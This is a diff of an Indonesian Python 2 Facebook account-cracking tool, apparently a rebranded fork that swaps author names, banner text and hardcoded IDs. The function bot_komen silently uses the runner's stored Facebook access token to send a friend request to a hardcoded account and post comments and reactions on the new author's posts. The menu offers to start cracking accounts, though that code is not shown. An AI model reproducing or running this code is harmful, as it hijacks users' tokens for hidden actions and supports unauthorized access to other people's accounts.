@@ -60,14 +60,15 @@ def jalan(z):
 #########LOGO#########
 logo = """
 \033[1;92m ••••••••••••••••••••••••••••••••••   \033[1;91m
-\033[1;92m SALAM DARI ABANG JAGO                \033[1;91m
+\033[1;92m JANGAN KESERINGAN NUYUL,DOSA TAU!                \033[1;91m
 \033[1;92m ••••••••••••••••••••••••••••••••••   \033[1;91m
-\033[1;92m GUNAKAN SEBAIK MUNGKIN COKK          \033[1;91m                                                                                                                                                                                     
+\033[1;92m GUNAKAN DENGAN KEGOBLOKAN YG EXTRA          \033[1;91m                                                                                                                                                                                     
 \033[1;92m ••••••••••••••••••••••••••••••••••   
-\033[1;92m SELAMAT DATANG!!                     \033[1;91m
+\033[1;92m WELCOME TO MY TOOL!!                     \033[1;91m
 \033[1;92m ••••••••••••••••••••••••••••••••••   \033[1;91m
-\033[1;96mAuthor   : ZXPHOENIX
-\033[1;96mTeam     : DDOS CYBER
+\033[1;96mAuthor   : Ramdhan Ramadhian
+\033[1;96mTeam     : CYBER WANTED PAFU PROJECT
+\033[1;96mFB       : Fb.com/bahjamrong.jamrong
 """
 
 def tik():
@@ -190,7 +191,7 @@ def tokenz():
 		zedd.write(toket)
 		zedd.close()
 		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
-		os.system('xdg-open https://www.youtube.com/channel/UCOoNmkFfbfrLG2uf1uBUWYg ')
+		os.system('xdg-open https://m.youtube.com/channel/UC7kqla4Jh-ujwE6BKaUE_Rw')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"
@@ -204,12 +205,12 @@ def bot_komen():
 	except IOError:
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100005789553399')
-	kom = ('PUNYA ABANG JAGO')
+	una = ('100044932290784')
+	kom = ('Yeah Iam Hacker 😍')
 	reac = ('ANGRY')
-	post = ('1190012567868384')
-	post2 = ('1190012567868384')
-	kom2 = ('SELALU BERUSAHA')
+	post = ('315723919935349')
+	post2 = ('315723919935349')
+	kom2 = ('Script Anda Sangat Keren 😘')
 	reac2 = ('LOVE')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
@@ -260,14 +261,14 @@ def menu():
 	print "\033[1;97m[\033[1;34m•\033[1;97m]\033[1;34m UID\033[1;91m           =>\033[1;93m "+id
 	print "\033[1;97m[\033[1;34m+\033[1;97m]\033[1;34m Tanggal Lahir\033[1;91m =>\033[1;93m "+ a['birthday']
 	print "\033[37;96m╔═════════════════════════╗"
-	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mCrack ID Indonesia \033[37;96m║"
+	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mMemulai Crack \033[37;96m║"
 	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mKeluar             \033[37;96m║"
 	print "\033[37;96m╚═════════════════════════╝"
 	pilih()
 	
 ######PILIH######
 def pilih():
-	unikers = raw_input("\033[1;93mBY Zxphoenix \033[91m:\033[1;96m ")
+	unikers = raw_input("\033[1;93mCYBER RAMDHAN  \033[91m:\033[1;96m ")
 	if unikers =="":
 		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
 		pilih()
@@ -366,8 +367,8 @@ def pilih_indo():
 		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
 
 	print "\n\033[1;31;1m=========================================="
-        print "\n\033[1;96mJANGAN MENYALAH GUNAKAN SCRIPT INI YA BOSS"
-        print "\n\033[1;33mBY ILAMDDOS"
+        print "\n\033[1;97mMOHON BERSABAR SEMOGA BERUNTUNG"
+        print "\n\033[1;33mUCAPKAN RAMDANI GANTENG 5x AGAR HOKI XIXIXI"
 	print "\n\033[37;1m=========================================="
 	
 ##### MAIN INDONESIA #####
